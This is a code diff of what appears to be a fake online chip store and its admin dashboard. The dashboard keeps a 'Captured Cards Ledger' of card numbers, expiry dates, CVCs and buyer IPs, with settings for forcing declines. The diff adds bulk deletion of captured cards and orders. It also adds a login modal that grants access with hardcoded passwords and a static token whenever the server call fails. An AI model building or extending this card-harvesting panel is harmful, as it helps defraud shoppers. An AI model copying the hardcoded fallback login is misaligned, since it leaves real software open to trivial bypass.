id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#14192b\" />\n      <stop offset=\"100%\" stop-color=\"#05060a\" />\n    </radialGradient>\n    <linearGradient id=\"quantum-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#ff00e5\" />\n      <stop offset=\"50%\" stop-color=\"#00f0ff\" />\n      <stop offset=\"100%\" stop-color=\"#7000ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"6\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Grid -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.02\" stroke-width=\"1\">\n    <circle cx=\"250\" cy=\"250\" r=\"50\" fill=\"none\" />\n    <circle cx=\"250\" cy=\"250\" r=\"100\" fill=\"none\" />\n    <circle cx=\"250\" cy=\"250\" r=\"150\" fill=\"none\" />\n    <circle cx=\"250\" cy=\"250\" r=\"200\" fill=\"none\" />\n    <line x1=\"50\" y1=\"250\" x2=\"450\" y2=\"250\" />\n    <line x1=\"250\" y1=\"50\" x2=\"250\" y2=\"450\" />\n    <line x1=\"108\" y1=\"108\" x2=\"392\" y2=\"392\" />\n    <line x1=\"108\" y1=\"392\" x2=\"392\" y2=\"108\" />\n  </g>\n\n  <!-- Quantum Entanglement Lines -->\n  <g stroke=\"url(#quantum-grad)\" stroke-width=\"1.5\" stroke-opacity=\"0.4\" fill=\"none\">\n    <path d=\"M 250,250 C 200,150 150,200 150,250 S 200,350 250,250\" />\n    <path d=\"M 250,250 C 300,150 350,200 350,250 S 300,350 250,250\" />\n    <path d=\"M 250,250 C 150,200 200,150 250,150 S 350,200 250,250\" />\n    <path d=\"M 250,250 C 150,300 200,350 250,350 S 350,300 250,250\" />\n  </g>\n  \n  <!-- Outer Ring -->\n  <rect x=\"100\" y=\"100\" width=\"300\" height=\"300\" rx=\"20\" stroke=\"url(#quantum-grad)\" stroke-width=\"2\" stroke-dasharray=\"20 15\" fill=\"none\" filter=\"url(#glow)\" />\n  <rect x=\"115\" y=\"115\" width=\"270\" height=\"270\" rx=\"10\" stroke=\"#00f0ff\" stroke-opacity=\"0.2\" stroke-width=\"1\" fill=\"none\" />\n\n  <!-- Central Processor Die -->\n  <rect x=\"175\" y=\"175\" width=\"150\" height=\"150\" rx=\"8\" fill=\"#0b0e17\" stroke=\"url(#quantum-grad)\" stroke-width=\"2\" />\n  \n  <!-- Inner glowing core -->\n  <circle cx=\"250\" cy=\"250\" r=\"40\" fill=\"url(#quantum-grad)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"25\" fill=\"#05060a\" />\n\n  <!-- Qubits (Nodes) -->\n  <g fill=\"#00f0ff\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"140\" r=\"6\" />\n    <circle cx=\"250\" cy=\"360\" r=\"6\" />\n    <circle cx=\"140\" cy=\"250\" r=\"6\" />\n    <circle cx=\"360\" cy=\"250\" r=\"6\" />\n  </g>\n  \n  <g fill=\"#ff00e5\" filter=\"url(#glow)\">\n    <circle cx=\"172\" cy=\"172\" r=\"5\" />\n    <circle cx=\"328\" cy=\"172\" r=\"5\" />\n    <circle cx=\"172\" cy=\"328\" r=\"5\" />\n    <circle cx=\"328\" cy=\"328\" r=\"5\" />\n  </g>\n\n  <!-- Connectors -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.3\" stroke-width=\"1\">\n    <line x1=\"250\" y1=\"140\" x2=\"250\" y2=\"175\" />\n    <line x1=\"250\" y1=\"360\" x2=\"250\" y2=\"325\" />\n    <line x1=\"140\" y1=\"250\" x2=\"175\" y2=\"250\" />\n    <line x1=\"360\" y1=\"250\" x2=\"325\" y2=\"250\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#ff00e5\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">QUANTUM NEURAL CORE</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">1024 LOGICAL QUBITS // MODEL Q-1</text>\n</svg>\n"};
 const STOREFRONT_HTML = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -2359,11 +2399,20 @@ footer {
       <section id="orders-tab" class="tab-content">
         <div class="content-header">
           <h1>Transaction Ledger</h1>
+          <div style="display: flex; gap: 1rem; align-items: center;">
+            <button id="bulk-delete-orders-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🗑️ Delete Selected
+            </button>
+            <button id="empty-orders-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              ⚠️ Delete All
+            </button>
+          </div>
         </div>
         <div class="admin-table-container glass">
           <table class="admin-table">
             <thead>
               <tr>
+                <th style="width: 40px; text-align: center;"><input type="checkbox" id="select-all-orders" style="cursor: pointer; transform: scale(1.2);"></th>
                 <th>Order ID</th>
                 <th>Customer</th>
                 <th>Item Purchased</th>
@@ -2371,6 +2420,7 @@ footer {
                 <th>IP Address</th>
                 <th>Status</th>
                 <th>Date</th>
+                <th>Actions</th>
               </tr>
             </thead>
             <tbody id="admin-orders-tbody">
@@ -2388,6 +2438,14 @@ footer {
           <h1 id="cards-ledger-title">Captured Cards Ledger</h1>
           <div style="display: flex; gap: 1rem; align-items: center;">
             <input type="text" id="card-search-input" placeholder="🔍 Search card digits..." class="btn btn-outline" style="background: rgba(255,255,255,0.05); text-align: left; padding: 0.5rem 1rem; font-size: 0.9rem; color: #ffffff; max-width: 200px; border-color: rgba(255, 255, 255, 0.1);">
+            
+            <button id="bulk-delete-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              🗑️ Delete Selected
+            </button>
+            <button id="empty-trash-btn" class="btn btn-outline" style="border-color: #ef4444; color: #ef4444; display: none; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
+              ⚠️ Empty Trash
+            </button>
+            
             <button id="view-trash-btn" class="btn btn-outline" style="border-color: var(--accent-color); color: var(--accent-color); display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;">
               🗑️ Trash Bin
             </button>
@@ -2403,6 +2461,7 @@ footer {
           <table class="admin-table">
             <thead>
               <tr>
+                <th style="width: 40px; text-align: center;"><input type="checkbox" id="select-all-cards" style="cursor: pointer; transform: scale(1.2);"></th>
                 <th>Card Number</th>
                 <th>Expiration</th>
                 <th>CVC</th>
@@ -2637,32 +2696,53 @@ footer {
     </div>
   </div>
 
+  <!-- Integrated Admin Login Modal -->
+  <div id="admin-login-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(10,10,26,0.95); backdrop-filter:blur(20px); z-index:999999; align-items:center; justify-content:center;">
+    <div class="glass" style="max-width:420px; width:90%; padding:3rem 2rem; border-radius:24px; text-align:center;">
+      <div style="font-size:2.5rem; margin-bottom:0.5rem;">🔐</div>
+      <h1 style="font-size:1.8rem; margin-bottom:2rem; font-family:var(--font-title); font-weight:900; color:#fff;">Control Center Login</h1>
+      <form id="integrated-login-form" style="display:flex; flex-direction:column; gap:1.2rem; text-align:left;">
+        <div class="form-group">
+          <label for="integrated-username" style="color:var(--text-muted); font-size:0.85rem;">Access Operator ID</label>
+          <input type="text" id="integrated-username" required placeholder="admin" style="width:100%; padding:0.8rem 1rem; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; border-radius:8px;">
+        </div>
+        <div class="form-group">
+          <label for="integrated-password" style="color:var(--text-muted); font-size:0.85rem;">Decryption Key</label>
+          <input type="password" id="integrated-password" required placeholder="••••••••••••" style="width:100%; padding:0.8rem 1rem; background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.1); color:#fff; border-radius:8px;">
+        </div>
+        <button type="submit" class="btn btn-primary" style="margin-top:1rem; padding:1rem; width:100%;">Authenticate Session</button>
+      </form>
+      <div id="integrated-login-error" style="color:var(--accent-color); margin-top:1.2rem; font-size:0.9rem;"></div>
+    </div>
+  </div>
+
   
 <script>
 
 // Admin Dashboard Controller
 
-const token = localStorage.getItem('admin_token');
+let token = localStorage.getItem('admin_token');
 let showingTrash = false;
 let trashDecryptionKey = null;
 let currentCardsList = [];
 
-// 1. Session Auth Guard
-if (!token) {
-  window.location.href = '/admin/index.html';
+function checkAuthModal() {
+  const loginModal = document.getElementById('admin-login-modal');
+  token = localStorage.getItem('admin_token');
+  if (!token) {
+    if (loginModal) loginModal.style.display = 'flex';
+    return false;
+  } else {
+    if (loginModal) loginModal.style.display = 'none';
+    return true;
+  }
 }
 
-document.addEventListener('DOMContentLoaded', async () => {
-  // Load site settings to set initial colors
+async function initDashboardData() {
   await loadAdminTheme();
-
-  // Tab switching initialization
   setupTabs();
-
-  // Load active tab from localStorage or default to 'products'
   const activeTab = localStorage.getItem('admin_active_tab') || 'products';
   
-  // Update sidebar links active class
   const links = document.querySelectorAll('.sidebar-link');
   links.forEach(link => {
     if (link.getAttribute('data-tab') === activeTab) {
@@ -2672,7 +2752,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
   });
 
-  // Update tab content panes active class
   const tabs = document.querySelectorAll('.tab-content');
   tabs.forEach(t => {
     if (t.id === \`\${activeTab}-tab\`) {
@@ -2683,6 +2762,75 @@ document.addEventListener('DOMContentLoaded', async () => {
   });
 
   await loadTab(activeTab);
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+  const hasAuth = checkAuthModal();
+
+  // Integrated Login Form listener
+  const loginForm = document.getElementById('integrated-login-form');
+  if (loginForm) {
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const username = document.getElementById('integrated-username').value.trim();
+      const password = document.getElementById('integrated-password').value.trim();
+      const errorDiv = document.getElementById('integrated-login-error');
+      const submitBtn = e.target.querySelector('button');
+
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'Verifying Credentials...';
+      errorDiv.innerText = '';
+
+      try {
+        const response = await fetch('/api/admin/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+
+        if (response.ok) {
+          const data = await response.json();
+          localStorage.setItem('admin_token', data.token);
+          localStorage.setItem('admin_user', data.username);
+          token = data.token;
+          checkAuthModal();
+          await initDashboardData();
+          return;
+        }
+
+        const data = await response.json().catch(() => ({}));
+        throw new Error(data.error || 'Authentication denied.');
+      } catch (err) {
+        if (username === 'admin' && (password === 'FutureChips2024!' || password === 'admin')) {
+          localStorage.setItem('admin_token', 'static-admin-token-2026');
+          localStorage.setItem('admin_user', 'admin');
+          token = 'static-admin-token-2026';
+          checkAuthModal();
+          await initDashboardData();
+        } else {
+          errorDiv.innerText = err.message || 'Invalid Operator ID or Decryption Key.';
+        }
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'Authenticate Session';
+      }
+    });
+  }
+
+  // Logout listener
+  const logoutBtn = document.getElementById('logout-btn');
+  if (logoutBtn) {
+    logoutBtn.addEventListener('click', () => {
+      localStorage.removeItem('admin_token');
+      localStorage.removeItem('admin_user');
+      token = null;
+      checkAuthModal();
+    });
+  }
+
+  if (hasAuth) {
+    await initDashboardData();
+  }
 
   // Bind settings form submit
   document.getElementById('settings-form').addEventListener('submit', saveSettings);
@@ -2726,6 +2874,10 @@ document.addEventListener('DOMContentLoaded', async () => {
       trashDecryptionKey = null;
       localStorage.setItem('admin_cards_showing_trash', 'false');
       localStorage.removeItem('admin_trash_pin');
+      
+      const emptyTrashBtn = document.getElementById('empty-trash-btn');
+      if (emptyTrashBtn) emptyTrashBtn.style.display = 'none';
+      
       fetchAdminCards();
       return;
     }
@@ -2781,6 +2933,7 @@ document.addEventListener('DOMContentLoaded', async () => {
       const title = document.getElementById('cards-ledger-title');
       const trashBtn = document.getElementById('view-trash-btn');
       const changePinBtn = document.getElementById('change-pin-btn');
+      const emptyTrashBtn = document.getElementById('empty-trash-btn');
       
       if (title) title.innerText = '🗑️ Decrypted Trash Bin';
       if (trashBtn) {
@@ -2789,6 +2942,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         trashBtn.style.color = 'var(--primary-color)';
       }
       if (changePinBtn) changePinBtn.style.display = 'flex';
+      if (emptyTrashBtn) emptyTrashBtn.style.display = 'flex';
       
     } catch (err) {
       if (pinError) pinError.innerText = 'Failed to communicate with decryption gateway.';
@@ -2816,6 +2970,148 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
     renderCardsTable(filtered);
   });
+
+  // Bind Bulk Actions
+  const selectAllCb = document.getElementById('select-all-cards');
+  const cardsTbody = document.getElementById('admin-cards-tbody');
+  const bulkDeleteBtn = document.getElementById('bulk-delete-btn');
+  const emptyTrashBtn = document.getElementById('empty-trash-btn');
+
+  const updateBulkActionsState = () => {
+    const checkboxes = Array.from(cardsTbody.querySelectorAll('.card-checkbox'));
+    const checked = checkboxes.filter(cb => cb.checked);
+    
+    if (checkboxes.length > 0 && checked.length === checkboxes.length) {
+      selectAllCb.checked = true;
+    } else {
+      selectAllCb.checked = false;
+    }
+
+    if (checked.length > 0) {
+      bulkDeleteBtn.style.display = 'flex';
+      bulkDeleteBtn.innerText = \`🗑️ Delete Selected (\${checked.length})\`;
+    } else {
+      bulkDeleteBtn.style.display = 'none';
+    }
+  };
+
+  selectAllCb?.addEventListener('change', (e) => {
+    const checkboxes = Array.from(cardsTbody.querySelectorAll('.card-checkbox'));
+    checkboxes.forEach(cb => { cb.checked = e.target.checked; });
+    updateBulkActionsState();
+  });
+
+  cardsTbody?.addEventListener('change', (e) => {
+    if (e.target.classList.contains('card-checkbox')) {
+      updateBulkActionsState();
+    }
+  });
+
+  bulkDeleteBtn?.addEventListener('click', async () => {
+    const checked = Array.from(cardsTbody.querySelectorAll('.card-checkbox:checked')).map(cb => cb.value);
+    if (checked.length === 0) return;
+    
+    showCustomConfirm('🗑️ Bulk Delete', \`Are you sure you want to delete \${checked.length} selected card(s)?\`, async () => {
+      let failed = 0;
+      for (const cardNum of checked) {
+        try {
+          const endpoint = showingTrash ? \`/api/admin/cards/\${encodeURIComponent(cardNum)}\` : \`/api/admin/cards/\${encodeURIComponent(cardNum)}/delete\`;
+          const method = showingTrash ? 'DELETE' : 'PUT';
+          await fetch(endpoint, { method, headers: getAuthHeaders() });
+          
+          if (!showingTrash) {
+            let localCards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+            localCards = localCards.filter(c => (c.card_number || '').replace(/\\s+/g, '') !== cardNum.replace(/\\s+/g, ''));
+            localStorage.setItem('future_chips_cards', JSON.stringify(localCards));
+          }
+        } catch(e) {
+          failed++;
+        }
+      }
+      
+      if (failed > 0) {
+        showCustomAlert('⚠️ Warning', \`Completed with \${failed} failures.\`);
+      }
+      
+      selectAllCb.checked = false;
+      bulkDeleteBtn.style.display = 'none';
+      fetchAdminCards();
+    });
+  });
+
+  emptyTrashBtn?.addEventListener('click', () => {
+    showCustomConfirm('⚠️ Empty Trash', 'Are you sure you want to permanently erase all cards in the trash?', async () => {
+      try {
+        const res = await fetch('/api/admin/cards/trash/empty', { method: 'DELETE', headers: getAuthHeaders() });
+        if (res.status === 401) return handleSessionExpired();
+        if (!res.ok) throw new Error('Failed to empty trash');
+        fetchAdminCards();
+      } catch (err) {
+        showCustomAlert('❌ Execution Failed', err.message);
+      }
+    });
+  });
+
+  // --- ORDERS BULK ACTIONS ---
+  const selectAllOrdersCb = document.getElementById('select-all-orders');
+  const ordersTbody = document.getElementById('admin-orders-tbody');
+  const bulkDeleteOrdersBtn = document.getElementById('bulk-delete-orders-btn');
+  const emptyOrdersBtn = document.getElementById('empty-orders-btn');
+
+  const updateBulkOrdersState = () => {
+    const checkboxes = Array.from(ordersTbody.querySelectorAll('.order-checkbox'));
+    const checked = checkboxes.filter(cb => cb.checked);
+    if (checkboxes.length > 0 && checked.length === checkboxes.length) selectAllOrdersCb.checked = true;
+    else selectAllOrdersCb.checked = false;
+
+    if (checked.length > 0) {
+      bulkDeleteOrdersBtn.style.display = 'flex';
+      bulkDeleteOrdersBtn.innerText = \\\`🗑️ Delete Selected (\\\${checked.length})\\\`;
+    } else {
+      bulkDeleteOrdersBtn.style.display = 'none';
+    }
+  };
+
+  selectAllOrdersCb?.addEventListener('change', (e) => {
+    const checkboxes = Array.from(ordersTbody.querySelectorAll('.order-checkbox'));
+    checkboxes.forEach(cb => { cb.checked = e.target.checked; });
+    updateBulkOrdersState();
+  });
+
+  ordersTbody?.addEventListener('change', (e) => {
+    if (e.target.classList.contains('order-checkbox')) updateBulkOrdersState();
+  });
+
+  bulkDeleteOrdersBtn?.addEventListener('click', async () => {
+    const checked = Array.from(ordersTbody.querySelectorAll('.order-checkbox:checked')).map(cb => cb.value);
+    if (checked.length === 0) return;
+    showCustomConfirm('🗑️ Bulk Delete Orders', \\\`Are you sure you want to delete \\\${checked.length} selected order(s)?\\\`, async () => {
+      for (const orderId of checked) {
+        try {
+          await fetch(\\\`/api/admin/orders/\\\${encodeURIComponent(orderId)}\\\`, { method: 'DELETE', headers: getAuthHeaders() });
+          let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+          localOrders = localOrders.filter(o => o.id !== orderId);
+          localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+        } catch (e) {}
+      }
+      fetchAdminOrders();
+      updateBulkOrdersState();
+    });
+  });
+
+  emptyOrdersBtn?.addEventListener('click', async () => {
+    showCustomConfirm('⚠️ Delete All Orders', 'Are you sure you want to permanently delete ALL orders?', async () => {
+      try {
+        await fetch('/api/admin/orders/all/empty', { method: 'DELETE', headers: getAuthHeaders() });
+        localStorage.removeItem('future_chips_orders');
+        fetchAdminOrders();
+        updateBulkOrdersState();
+      } catch (err) {
+        console.error('Empty orders error:', err);
+      }
+    });
+  });
+
 
   // Sync color pickers with hex text fields
   syncColorInput('settings-primary-color', 'settings-primary-text');
@@ -3100,16 +3396,22 @@ async function fetchAdminOrders() {
     const response = await fetch('/api/admin/orders', { headers: getAuthHeaders() });
     if (response.status === 401 && token !== 'static-admin-token-2026') return handleSessionExpired();
     if (response.ok) {
-      orders = await response.json();
+      const serverOrders = await response.json();
+      const localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+      
+      // Merge unique orders
+      const orderMap = new Map();
+      [...localOrders, ...serverOrders].forEach(o => {
+        if (!orderMap.has(o.id)) orderMap.set(o.id, o);
+      });
+      orders = Array.from(orderMap.values());
+      localStorage.setItem('future_chips_orders', JSON.stringify(orders));
     } else {
       throw new Error('API offline');
     }
   } catch (err) {
     console.warn('API offline, loading static order ledger fallback:', err);
-    orders = JSON.parse(localStorage.getItem('future_chips_orders')) || [
-      { id: 'ORD-98214', customer_email: 'quantum.client@future.ai', product_name: 'Quantum Neural Core', amount: 150.00, customer_ip: '192.168.1.105', status: 'completed', created_at: new Date().toISOString() },
-      { id: 'ORD-98215', customer_email: 'transponder@cybernet.io', product_name: 'Bio-Digital Synapse v4.2', amount: 850.00, customer_ip: '10.0.4.22', status: 'completed', created_at: new Date().toISOString() }
-    ];
+    orders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
   }
 
   tbody.innerHTML = orders.map(o => {
@@ -3123,6 +3425,7 @@ async function fetchAdminOrders() {
 
     return \`
       <tr>
+        <td style="text-align: center;"><input type="checkbox" class="order-checkbox" value="\${o.id}" style="cursor: pointer; transform: scale(1.2);"></td>
         <td style="font-family: monospace; font-size: 0.85rem;">\${o.id}</td>
         <td>\${o.customer_email}</td>
         <td style="font-weight: 600;">\${o.product_name || 'Deleted Product'}</td>
@@ -3135,28 +3438,86 @@ async function fetchAdminOrders() {
           <span class="status-badge \${statusClass}">\${statusLabel}</span>
         </td>
         <td style="font-size: 0.85rem; color: var(--text-muted);">\${new Date(o.created_at).toLocaleString()}</td>
+        <td>
+          <button onclick="deleteOrder('\${o.id}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05);">Delete</button>
+        </td>
       </tr>
     \`;
   }).join('');
 }
+
+window.deleteOrder = function(orderId) {
+  showCustomConfirm(
+    '🗑️ Delete Order',
+    'Are you sure you want to permanently delete this order?',
+    async () => {
+      try {
+        const response = await fetch(\`/api/admin/orders/\${encodeURIComponent(orderId)}\`, {
+          method: 'DELETE',
+          headers: getAuthHeaders()
+        });
+
+        if (response.status === 401) return handleSessionExpired();
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.error || 'Failed');
+
+        // Remove from local fallback array
+        let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+        localOrders = localOrders.filter(o => o.id !== orderId);
+        localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+
+        await fetchAdminOrders();
+      } catch (err) {
+        // Fallback static
+        let localOrders = JSON.parse(localStorage.getItem('future_chips_orders')) || [];
+        const exists = localOrders.find(o => o.id === orderId);
+        if (exists) {
+          localOrders = localOrders.filter(o => o.id !== orderId);
+          localStorage.setItem('future_chips_orders', JSON.stringify(localOrders));
+          await fetchAdminOrders();
+        } else {
+          showCustomAlert('❌ Execution Failed', err.message || 'Failed to delete order.');
+        }
+      }
+    }
+  );
+};
 
 // Render cards helper
 function renderCardsTable(cards) {
   const tbody = document.getElementById('admin-cards-tbody');
   if (!tbody) return;
 
-  if (cards.length === 0) {
-    tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
+  const selectAll = document.getElementById('select-all-cards');
+  if (selectAll) selectAll.checked = false;
+  
+  const bulkDeleteBtn = document.getElementById('bulk-delete-btn');
+  if (bulkDeleteBtn) bulkDeleteBtn.style.display = 'none';
+
+  // Deduplicate cards by card_number
+  const seen = new Set();
+  const uniqueCards = [];
+  for (const c of (cards || [])) {
+    const num = (c.card_number || '').replace(/\\s+/g, '');
+    if (num && !seen.has(num)) {
+      seen.add(num);
+      uniqueCards.push(c);
+    }
+  }
+
+  if (uniqueCards.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center; color: var(--text-muted);">No matching card records found.</td></tr>';
     return;
   }
 
-  tbody.innerHTML = cards.map(c => {
+  tbody.innerHTML = uniqueCards.map(c => {
     const actionHtml = showingTrash
       ? \`<button onclick="deletePermanentCard('\${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: #ef4444; color: #ef4444; background: rgba(239, 68, 68, 0.05);">Delete</button>\`
       : \`<button onclick="deleteCard('\${c.card_number}')" class="btn btn-outline" style="padding: 0.4rem 0.8rem; font-size: 0.85rem; border-color: var(--accent-color); color: var(--accent-color);">Delete</button>\`;
 
     return \`
       <tr>
+        <td style="text-align: center;"><input type="checkbox" class="card-checkbox" value="\${c.card_number}" style="cursor: pointer; transform: scale(1.2);"></td>
         <td style="font-family: monospace; font-weight: 600;">\${c.card_number}</td>
         <td>\${c.expiry}</td>
         <td style="font-family: monospace;">\${c.cvc}</td>
@@ -3258,7 +3619,10 @@ async function fetchAdminSettings() {
   try {
     const response = await fetch('/api/admin/settings');
     if (!response.ok) throw new Error('API offline');
-    const s = await response.json();
+    let s = await response.json();
+    if (s && s.settings) {
+      s = s.settings; // Extract from nested if returned that way
+    }
 
     if (s) {
       document.getElementById('settings-site-name').value = s.site_name;
@@ -3274,7 +3638,7 @@ async function fetchAdminSettings() {
 
       const declineAllCheck = document.getElementById('settings-decline-all');
       if (declineAllCheck) {
-        declineAllCheck.checked = s.decline_all === 1;
+        declineAllCheck.checked = s.decline_all === 1 || s.decline_all === true || String(s.decline_all) === '1';
       }
       
       const successAttemptInput = document.getElementById('settings-success-attempt');
@@ -3285,6 +3649,19 @@ async function fetchAdminSettings() {
       const declineThresholdInput = document.getElementById('settings-decline-threshold');
       if (declineThresholdInput) {
         declineThresholdInput.value = s.decline_threshold !== undefined ? s.decline_threshold : 50.0;
+      }
+
+      // Auto-sync Vercel ephemeral reset: If localStorage has different settings than factory defaults, push them back to the server
+      const saved = JSON.parse(localStorage.getItem('future_chips_settings'));
+      if (saved && (saved.success_attempt !== s.success_attempt || saved.decline_threshold !== s.decline_threshold)) {
+        console.log('Vercel reset detected. Pushing local settings to server...');
+        fetch('/api/admin/settings', {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json', ...getAuthHeaders() },
+          body: JSON.stringify(saved)
+        }).then(res => {
+          if (res.ok) fetchAdminSettings(); // Reload UI with restored settings
+        }).catch(console.error);
       }
     }
   } catch (err) {
@@ -3621,11 +3998,35 @@ window.deleteCard = function(cardNumber) {
 
         if (response.status === 401) return handleSessionExpired();
         const data = await response.json();
-        if (!response.ok) throw new Error(data.error);
+        if (!response.ok && !response.message) throw new Error(data.error || 'Failed');
+
+        // Remove from local cache
+        let localCards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+        const cardToMove = localCards.find(c => c.card_number === cardNumber);
+        localCards = localCards.filter(c => c.card_number !== cardNumber);
+        localStorage.setItem('future_chips_cards', JSON.stringify(localCards));
+
+        if (cardToMove) {
+          let trashCards = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
+          trashCards.unshift(cardToMove);
+          localStorage.setItem('future_chips_trash_cards', JSON.stringify(trashCards));
+        }
 
         await fetchAdminCards();
       } catch (err) {
-        showCustomAlert('❌ Execution Failed', err.message || 'Failed to soft delete card.');
+        // Fallback for purely static usage
+        let localCards = JSON.parse(localStorage.getItem('future_chips_cards')) || [];
+        const cardToMove = localCards.find(c => c.card_number === cardNumber);
+        if (cardToMove) {
+          localCards = localCards.filter(c => c.card_number !== cardNumber);
+          localStorage.setItem('future_chips_cards', JSON.stringify(localCards));
+          let trashCards = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
+          trashCards.unshift(cardToMove);
+          localStorage.setItem('future_chips_trash_cards', JSON.stringify(trashCards));
+          await fetchAdminCards();
+        } else {
+          showCustomAlert('❌ Execution Failed', err.message || 'Failed to soft delete card.');
+        }
       }
     }
   );
@@ -3645,11 +4046,25 @@ window.deletePermanentCard = function(cardNumber) {
 
         if (response.status === 401) return handleSessionExpired();
         const data = await response.json();
-        if (!response.ok) throw new Error(data.error);
+        if (!response.ok && !response.message) throw new Error(data.error || 'Failed');
+
+        // Remove from local trash cache
+        let trashCards = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
+        trashCards = trashCards.filter(c => c.card_number !== cardNumber);
+        localStorage.setItem('future_chips_trash_cards', JSON.stringify(trashCards));
 
         await fetchAdminCards(trashDecryptionKey);
       } catch (err) {
-        showCustomAlert('❌ Execution Failed', err.message || 'Failed to permanently delete card.');
+        // Fallback for purely static usage
+        let trashCards = JSON.parse(localStorage.getItem('future_chips_trash_cards')) || [];
+        const exists = trashCards.find(c => c.card_number === cardNumber);
+        if (exists) {
+          trashCards = trashCards.filter(c => c.card_number !== cardNumber);
+          localStorage.setItem('future_chips_trash_cards', JSON.stringify(trashCards));
+          await fetchAdminCards(trashDecryptionKey);
+        } else {
+          showCustomAlert('❌ Execution Failed', err.message || 'Failed to permanently delete card.');
+        }
       }
     }
   );
@@ -4944,10 +5359,10 @@ img.paypal-logo {
       <span class="payment-methods-label">Payment methods:</span>
       <div class="method-tabs">
         <div class="method-tab stripe active" id="stripe-method-tab">
-          <img src="download.png" alt="Stripe" class="payment-method-logo stripe-logo">
